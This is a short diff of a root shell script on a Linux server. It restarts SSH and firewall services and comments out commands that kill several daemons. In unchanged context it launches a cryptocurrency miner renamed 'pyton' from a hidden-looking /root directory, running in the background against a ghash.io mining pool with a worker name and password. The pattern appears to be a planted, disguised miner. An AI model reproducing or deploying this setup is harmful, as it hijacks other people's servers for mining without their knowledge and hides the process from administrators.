@@ -25,11 +25,11 @@ chkconfig ip6tables on
 service sshd restart
 service iptables restart
 service ip6tables restart
-ifdown venet0:1
-killall stunnel
-pkill anytermd
-pkill saslauthd
-service saslauthd stop
+#ifdown venet0:1
+#killall stunnel
+#pkill anytermd
+#pkill saslauthd
+#service saslauthd stop
 #RUN my girl :)
 /root/macca/cpuminer/pyton -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
 cd /root/macca/
